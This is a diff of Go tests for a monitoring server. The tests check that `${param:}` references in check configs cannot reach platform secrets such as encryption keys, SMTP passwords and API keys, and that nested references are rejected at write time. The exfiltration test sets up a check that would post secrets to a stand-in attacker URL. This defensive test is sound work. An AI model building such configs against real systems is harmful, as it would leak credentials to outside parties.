@@ -8,6 +8,7 @@ import (
 
 	"github.com/fclairamb/solidping/server/internal/db/models"
 	"github.com/fclairamb/solidping/server/internal/handlers/checks"
+	"github.com/fclairamb/solidping/server/internal/paramkeys"
 )
 
 // refManifest builds a one-check document whose `body` — a key that is NOT in
@@ -41,7 +42,8 @@ func TestImportAndApplyStoreTheSameConfigForASecretReference(t *testing.T) {
 	svc, dbSvc, org := setupApplyService(t, true)
 	ctx := t.Context()
 
-	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID, "sso-authtest-password", "hunter2", true))
+	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID,
+		paramkeys.StorageKey("sso-authtest-password"), "hunter2", true))
 
 	importRes, err := svc.ImportChecks(ctx, org.Slug, refManifest("via-import"), false)
 	r.NoError(err)
@@ -102,7 +104,8 @@ func TestReferenceSurvivesTheExportRoundTrip(t *testing.T) {
 	svc, dbSvc, org := setupApplyService(t, true)
 	ctx := t.Context()
 
-	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID, "sso-authtest-password", "hunter2", true))
+	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID,
+		paramkeys.StorageKey("sso-authtest-password"), "hunter2", true))
 
 	_, err := svc.ApplyChecks(ctx, org.Slug, refManifest("round-trip"), checks.ApplyOptions{})
 	r.NoError(err)
@@ -133,22 +136,44 @@ func TestReferenceSurvivesTheExportRoundTrip(t *testing.T) {
 	r.Equal(0, replay.Created)
 }
 
-// TestReservedParameterKeyIsUnreferenceable is the leak the reserved registry
-// exists to close: a check config must not be able to read the organization's
-// own wrapped encryption key — or the instance's SMTP password — out through a
-// `${param:}` reference and post it to a URL of the author's choosing.
-func TestReservedParameterKeyIsUnreferenceable(t *testing.T) {
+// TestPlatformParametersAreUnreferenceable is the exfiltration guard, rewritten
+// after the spec-03 audit found the first version of this protection was a
+// denylist that already missed four instance credentials.
+//
+// Two things are asserted, over real rows in a real database:
+//
+//  1. An ORG-scoped platform key (the org's own wrapped encryption DEK) is not
+//     reachable — it lives outside paramkeys.OrgKeyPrefix.
+//  2. A SYSTEM parameter is not reachable AT ALL, whatever it is called. The
+//     `${param:}` system-wide fallback is gone; `msteams.app_secret` and
+//     friends were readable through it by any org admin who could write a check
+//     config, and no list of names could have kept up with that table.
+//
+// Every key below is seeded before it is referenced, so a green run means "the
+// lookup refused it", never "there was nothing there".
+func TestPlatformParametersAreUnreferenceable(t *testing.T) {
 	t.Parallel()
 	r := require.New(t)
 	svc, dbSvc, org := setupApplyService(t, true)
 	ctx := t.Context()
 
-	// Both halves of the lookup are seeded, so a green result can only mean the
-	// reservation refused it — not that there was nothing to find.
+	// Org-scoped platform material, written exactly where the credentials
+	// package writes it.
 	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID, "encryption.dek", "wrapped-dek-material", true))
-	r.NoError(dbSvc.SetSystemParameter(ctx, "email.password", "instance-smtp-password", true))
 
-	for _, key := range []string{"encryption.dek", "email.password"} {
+	// Instance-wide credentials, including the four the old denylist missed.
+	for _, key := range []string{
+		"msteams.app_secret", "posthog.personal_api_key", "posthog.project_api_key",
+		"telegram.webhook_secret", "email.password", "server.base_url",
+	} {
+		r.NoError(dbSvc.SetSystemParameter(ctx, key, "instance-"+key, true))
+	}
+
+	for _, key := range []string{
+		"encryption.dek", "msteams.app_secret", "posthog.personal_api_key",
+		"posthog.project_api_key", "telegram.webhook_secret", "email.password",
+		"server.base_url",
+	} {
 		exfil := manifestCheck("exfil")
 		exfil.Config = map[string]any{
 			"url":  "https://attacker.acme.com/collect",
@@ -157,5 +182,73 @@ func TestReservedParameterKeyIsUnreferenceable(t *testing.T) {
 
 		_, err := svc.ApplyChecks(ctx, org.Slug, doc("parity-manifest", exfil), checks.ApplyOptions{})
 		r.ErrorIsf(err, checks.ErrUnresolvedSecretRef, "${param:%s} must be unresolvable", key)
+	}
+
+	list, _, err := dbSvc.ListChecks(ctx, org.UID, &models.ListChecksFilter{})
+	r.NoError(err)
+	r.Empty(list, "not one exfiltration attempt may have been stored")
+}
+
+// TestAnOrgKeyThatLooksLikeAPlatformKeyStillWorks is the positive control for
+// the test above, and the reason the protection is a namespace rather than a
+// denylist: an org admin who creates a parameter literally called
+// "encryption.dek" gets THEIR value, because it is stored somewhere else
+// entirely. A denylist would have had to refuse the name; the namespace does
+// not need to care.
+func TestAnOrgKeyThatLooksLikeAPlatformKeyStillWorks(t *testing.T) {
+	t.Parallel()
+	r := require.New(t)
+	svc, dbSvc, org := setupApplyService(t, true)
+	ctx := t.Context()
+
+	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID, "encryption.dek", "PLATFORM-DEK", true))
+	r.NoError(dbSvc.SetOrgParameter(
+		ctx, org.UID, paramkeys.StorageKey("encryption.dek"), "the-org-own-value", true))
+
+	check := manifestCheck("lookalike")
+	check.Config = map[string]any{
+		"url":  "https://example.com",
+		"body": "v=${param:encryption.dek}",
+	}
+
+	_, err := svc.ApplyChecks(ctx, org.Slug, doc("parity-manifest", check), checks.ApplyOptions{})
+	r.NoError(err, "an org's own key must resolve even when it shares a platform key's name")
+
+	// And the reference — not either value — is what got stored.
+	row, err := dbSvc.GetCheckByUidOrSlug(ctx, org.UID, "lookalike")
+	r.NoError(err)
+	r.Equal("v=${param:encryption.dek}", row.Config["body"])
+}
+
+// TestNestedReferencesAreValidatedAtWriteTime covers the gap the spec-03 audit
+// found in dry run: validation used to walk only top-level config strings while
+// execution recursed, so a reference inside a nested map — a gRPC check's
+// `metadata`, say — passed /import, /apply and both dry runs and only failed
+// later, at execution. Dry run exists precisely to not do that.
+func TestNestedReferencesAreValidatedAtWriteTime(t *testing.T) {
+	t.Parallel()
+	r := require.New(t)
+	svc, _, org := setupApplyService(t, true)
+	ctx := t.Context()
+
+	nested := manifestCheck("grpc-nested")
+	nested.Type = "grpc"
+	nested.Config = map[string]any{
+		"target":  "grpc.acme.com:443",
+		"service": "health",
+		"metadata": map[string]any{
+			"authorization": "Bearer ${param:never-created}",
+		},
+	}
+
+	for _, dryRun := range []bool{true, false} {
+		_, err := svc.ApplyChecks(ctx, org.Slug, doc("parity-manifest", nested),
+			checks.ApplyOptions{DryRun: dryRun})
+		r.ErrorIsf(err, checks.ErrUnresolvedSecretRef,
+			"a nested unresolvable reference must be refused (dryRun=%v)", dryRun)
+
+		_, err = svc.ImportChecks(ctx, org.Slug, doc("parity-manifest", nested), dryRun)
+		r.ErrorIsf(err, checks.ErrUnresolvedSecretRef,
+			"import must refuse it too (dryRun=%v)", dryRun)
 	}
 }
